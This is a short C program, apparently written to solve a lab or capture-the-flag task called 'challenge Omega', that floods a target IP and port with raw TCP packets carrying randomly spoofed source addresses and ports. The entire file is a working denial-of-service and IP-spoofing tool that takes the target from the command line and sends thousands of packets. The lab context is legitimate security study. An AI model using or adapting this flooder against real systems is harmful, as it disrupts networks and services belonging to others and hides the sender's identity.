/**
 * Used to finish the challenge Omega.
 * Operate a l2-flooding attack.
 * Author Benxin ZHONG, 10 Avr. 2020.
*/

#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<time.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<netinet/in.h>
#include<arpa/inet.h>

#include "header.h"
#include "raw_ip.h"

// Function used to generate an ip addr.
void gen_ip(char *str_ip);
int gen_prt();

int main(int argc, char *argv[])
{
    srand(time(NULL));

    char src_ip[50];
    char dst_ip[50];
    int src_prt = 0;
    int dst_prt = 0;
    int rslt = 0;
    int num_sent = 0;

    char *msg = "hEllO wORLd.";
    uint16_t msg_len = strlen(msg);

    int NUM_REPEAT = 5000;
    if(argc < 3)
    {
        printf("Usage : %s dst_ip dst_port [num_repeat] [PRINT]", argv[0]);
        exit(1);
    }

    strcpy(dst_ip, argv[1]);
    dst_prt = atoi(argv[2]);

    if(argc >= 4)
        NUM_REPEAT = atoi(argv[3]);

    int PRINT = 0;
    if(argc >= 5)
        PRINT = 1;

    
    int sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock_fd < 0)
    {
        perror("Err creating raw socket.\n");
        return -1;
    }
    else
    {
        printf("Raw socket created.\n");
    }
    
    // 1 = on, 0 = off.
    int hincl = 1;  
    setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
	if(sock_fd < 0)
	{
        perror("Error configuring raw socket. ");

        close(sock_fd);
        return -1;
	}
	else
	{
		printf("Raw socket configured.\n");
	}

    for(int i=0; i<NUM_REPEAT; ++i)
    {
        gen_ip(src_ip);
        //gen_ip(dst_ip);
        src_prt = gen_prt();
        //dst_prt = gen_prt();

        //DEBUG: 
        printf("%5d : %5d, src %s:%4d\n", i, NUM_REPEAT, src_ip, src_prt);
        //printf("%5d : %5d, dst %s:%4d\n", i, NUM_REPEAT, dst_ip, dst_prt);

        rslt = send_raw_tcp(sock_fd, msg, msg_len, src_ip, src_prt, dst_ip, dst_prt, PRINT);
        if(rslt < 0)
        {
            perror("send err ");
            printf("\n");
        }
        else
            ++num_sent;

        int t_sleep = rand() % 200;
        printf("Sleep %d ms.\n", t_sleep);
        usleep(t_sleep*1000);
    }

    printf("Finished. %d sent out of %d.\n", num_sent, NUM_REPEAT);
}


void gen_ip(char * str_ip_buf)
{
    // Set random seed.
    int ip_num[4];
    for(int i=0; i<4; ++i)
        ip_num[i] = rand()%256;

    sprintf(str_ip_buf, "%d.%d.%d.%d", ip_num[0], ip_num[1], ip_num[2], ip_num[3]);
    return;
}


int gen_prt()
{
    return 8000 + rand()%4000;
}